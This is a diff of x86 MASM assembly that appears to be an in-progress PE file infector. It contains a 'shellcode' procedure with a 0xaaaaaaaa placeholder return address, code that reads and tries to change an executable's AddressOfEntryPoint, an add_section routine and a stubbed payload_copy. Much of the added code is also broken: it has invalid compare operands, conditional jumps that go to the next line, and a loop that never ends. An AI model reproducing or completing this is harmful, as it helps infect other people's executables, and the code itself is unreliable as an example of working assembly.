@@ -131,10 +131,15 @@ shellcode proc
 			call eax
 			add esp, 8
 			mov eax, 0xaaaaaaaa
-			jmp eax	
+			jmp GetSize
+		GetSize:
+			mov esi, ebp 
+			invoke GetFileSize, ebp, 0
+			mov edx, ebp
+			jmp eax
 	add esp, 1ch											
 	add esp, 0ch									
-	add esp, 4h									
+	add esp, 4h	
 	pop ebp		
 shellcode endp	
 
@@ -150,6 +155,18 @@ file_opener proc
 			add eax,[eax.IMAGE_DOS_HEADER.e_lfanew]
 			.if [eax.IMAGE_NT_HEADERS.Signature]==IMAGE_NT_SIGNATURE
 				invoke MessageBox,0,addr Valid,addr MsgBoxCap,MB_ICONASTERISK
+				mov ebx, eax.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint
+				SearchOEP:
+					mov ecx, 0
+					cmp ebx + ecx, edx
+					jb ChangeOEP
+					ChangeOEP:
+						cmp esi + edx, 0xaaaaaaaa
+						je Command
+						Command:
+							add esi, edx
+							mov esi, ebx
+							jmp SearchOEP
 			.endif 
 		.else 
 			invoke MessageBox,0,addr Invalid,addr MsgBoxCap,MB_ICONASTERISK
@@ -265,6 +282,10 @@ LOCAL ReturnValue:DWORD
 	.endif
 	Ret
 add_section endp
+
+payload_copy proc
+	;invoke RtlCopyMemory, addr dest, addr src, sizeof dest
+payload_copy endp
 
 main endp
 end main
